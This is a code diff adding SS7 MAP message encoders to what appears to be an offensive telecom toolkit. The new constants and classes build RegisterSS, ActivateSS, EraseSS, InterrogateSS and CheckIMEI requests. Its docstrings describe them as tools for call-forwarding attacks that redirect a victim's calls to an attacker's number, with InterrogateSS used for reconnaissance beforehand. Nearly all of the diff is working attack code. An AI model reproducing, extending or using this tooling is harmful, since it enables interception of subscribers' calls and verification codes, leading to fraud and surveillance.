@@ -29,6 +29,32 @@ MAP_SEND_IMSI = 58                   # SendIMSI
 # Short Message Service
 MAP_MT_FORWARD_SM = 44               # MT-ForwardSM
 
+# Supplementary Services
+MAP_REGISTER_SS = 10                 # RegisterSS - Call Forwarding setup
+MAP_ERASE_SS = 11                    # EraseSS - Remove supplementary service
+MAP_ACTIVATE_SS = 12                 # ActivateSS - Activate supplementary service
+MAP_DEACTIVATE_SS = 13               # DeactivateSS - Deactivate supplementary service
+MAP_INTERROGATE_SS = 14              # InterrogateSS - Query service status
+MAP_REGISTER_PASSWORD = 17           # RegisterPassword
+
+# Equipment Identity
+MAP_CHECK_IMEI = 43                  # CheckIMEI - IMEI blacklist check
+
+# Supplementary Service Codes (3GPP TS 29.002)
+SS_ALL_FORWARDING = 0x20             # All forwarding SS
+SS_CFU = 0x21                        # Call Forwarding Unconditional
+SS_CF_BUSY = 0x29                    # Call Forwarding on Busy
+SS_CF_NO_REPLY = 0x2A                # Call Forwarding on No Reply
+SS_CF_NOT_REACHABLE = 0x2B           # Call Forwarding on Not Reachable
+SS_ALL_CONDITIONAL = 0x28            # All Conditional Forwarding
+SS_CLIP = 0x30                       # Calling Line ID Presentation
+SS_CLIR = 0x31                       # Calling Line ID Restriction
+SS_CALL_WAITING = 0x41               # Call Waiting
+SS_CALL_HOLD = 0x42                  # Call Hold
+SS_ALL_BARRING = 0x90                # All Barring
+SS_BAOC = 0x92                       # Barring All Outgoing Calls
+SS_BAIC = 0x9A                       # Barring All Incoming Calls
+
 # MAP Parameter Tags (Context-specific)
 TAG_MSISDN = 0x80                    # [0] ISDN-AddressString
 TAG_IMSI = 0x80                      # [0] IMSI
@@ -337,3 +363,160 @@ class PurgeMS(MAPMessage):
         content += encode_context_tag(0, vlr_data)
         
         return encode_sequence(content)
+
+
+# ============================================
+# NEW: Supplementary Service Operations
+# ============================================
+
+class RegisterSS(MAPMessage):
+    """
+    MAP RegisterSS operation - Register supplementary service.
+    Used for call forwarding attacks:
+    - Forward victim's calls to attacker's number
+    - Set unconditional, busy, no-reply, not-reachable forwarding
+    
+    3GPP TS 29.002 Section 8.6.1
+    """
+    
+    def __init__(self, ss_code=SS_CFU, forwarded_to_number=None,
+                 forwarded_to_subaddress=None, no_reply_condition_time=None):
+        super().__init__(MAP_REGISTER_SS)
+        self.ss_code = ss_code
+        self.forwarded_to_number = forwarded_to_number
+        self.forwarded_to_subaddress = forwarded_to_subaddress
+        self.no_reply_condition_time = no_reply_condition_time
+    
+    def encode_parameter(self):
+        """
+        Encode RegisterSS-Arg:
+        ss-Code                    SS-Code,
+        forwardedToNumber          [4] ISDN-AddressString OPTIONAL,
+        forwardedToSubaddress      [6] ISDN-SubaddressString OPTIONAL,
+        noReplyConditionTime       [5] NoReplyConditionTime OPTIONAL
+        """
+        content = b''
+        
+        # ss-Code (OCTET STRING size 1)
+        content += encode_tlv(TAG_OCTET_STRING, bytes([self.ss_code]))
+        
+        # forwardedToNumber [4] ISDN-AddressString
+        if self.forwarded_to_number:
+            ftn_data = encode_msisdn(self.forwarded_to_number)
+            content += encode_context_tag(4, ftn_data)
+        
+        # noReplyConditionTime [5] INTEGER (5-30 seconds)
+        if self.no_reply_condition_time is not None:
+            nrct = max(5, min(30, self.no_reply_condition_time))
+            content += encode_context_tag(5, bytes([nrct]))
+        
+        # forwardedToSubaddress [6]
+        if self.forwarded_to_subaddress:
+            sub_data = encode_msisdn(self.forwarded_to_subaddress)
+            content += encode_context_tag(6, sub_data)
+        
+        return encode_sequence(content)
+
+
+class EraseSS(MAPMessage):
+    """
+    MAP EraseSS operation - Erase supplementary service.
+    Used to remove call forwarding or other SS from victim.
+    
+    3GPP TS 29.002 Section 8.6.2
+    """
+    
+    def __init__(self, ss_code=SS_CFU):
+        super().__init__(MAP_ERASE_SS)
+        self.ss_code = ss_code
+    
+    def encode_parameter(self):
+        """
+        Encode EraseSS-Arg:
+        ss-Code    SS-Code
+        """
+        content = b''
+        
+        # ss-Code
+        content += encode_tlv(TAG_OCTET_STRING, bytes([self.ss_code]))
+        
+        return encode_sequence(content)
+
+
+class ActivateSS(MAPMessage):
+    """
+    MAP ActivateSS operation - Activate supplementary service.
+    Used after RegisterSS to activate the forwarding.
+    
+    3GPP TS 29.002 Section 8.6.3
+    """
+    
+    def __init__(self, ss_code=SS_CFU):
+        super().__init__(MAP_ACTIVATE_SS)
+        self.ss_code = ss_code
+    
+    def encode_parameter(self):
+        """
+        Encode ActivateSS-Arg:
+        ss-Code    SS-Code
+        """
+        content = b''
+        content += encode_tlv(TAG_OCTET_STRING, bytes([self.ss_code]))
+        return encode_sequence(content)
+
+
+class DeactivateSS(MAPMessage):
+    """
+    MAP DeactivateSS operation - Deactivate supplementary service.
+    
+    3GPP TS 29.002 Section 8.6.4
+    """
+    
+    def __init__(self, ss_code=SS_CFU):
+        super().__init__(MAP_DEACTIVATE_SS)
+        self.ss_code = ss_code
+    
+    def encode_parameter(self):
+        """Encode DeactivateSS-Arg."""
+        content = encode_tlv(TAG_OCTET_STRING, bytes([self.ss_code]))
+        return encode_sequence(content)
+
+
+class InterrogateSS(MAPMessage):
+    """
+    MAP InterrogateSS operation - Query supplementary service status.
+    Used for reconnaissance before RegisterSS attack.
+    
+    3GPP TS 29.002 Section 8.6.5
+    """
+    
+    def __init__(self, ss_code=SS_ALL_FORWARDING):
+        super().__init__(MAP_INTERROGATE_SS)
+        self.ss_code = ss_code
+    
+    def encode_parameter(self):
+        """Encode InterrogateSS-Arg."""
+        content = encode_tlv(TAG_OCTET_STRING, bytes([self.ss_code]))
+        return encode_sequence(content)
+
+
+class CheckIMEI(MAPMessage):
+    """
+    MAP CheckIMEI operation - Check device IMEI against EIR.
+    Used to verify if a device is blacklisted/whitelisted.
+    
+    3GPP TS 29.002 Section 8.7.1
+    """
+    
+    def __init__(self, imei):
+        super().__init__(MAP_CHECK_IMEI)
+        self.imei = imei
+    
+    def encode_parameter(self):
+        """
+        Encode CheckIMEI-Arg:
+        imei    IMEI
+        """
+        # IMEI is encoded as TBCD string (15 digits)
+        imei_tbcd = encode_tbcd(self.imei)
+        return imei_tbcd  # Simple encoding - just TBCD IMEI
